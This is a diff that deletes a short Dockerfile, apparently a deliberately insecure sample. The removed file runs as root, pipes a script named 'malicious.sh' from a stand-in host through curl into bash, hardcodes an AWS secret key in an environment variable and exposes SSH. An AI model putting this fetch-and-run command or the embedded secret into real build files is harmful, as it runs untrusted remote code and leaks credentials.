@@ -1,7 +1,0 @@
-FROM ubuntu:latest
-USER root
-RUN apt-get update && apt-get install -y sudo curl wget
-RUN curl http://example.com/malicious.sh | bash
-ENV AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE
-EXPOSE 22
-CMD ["/bin/bash"]
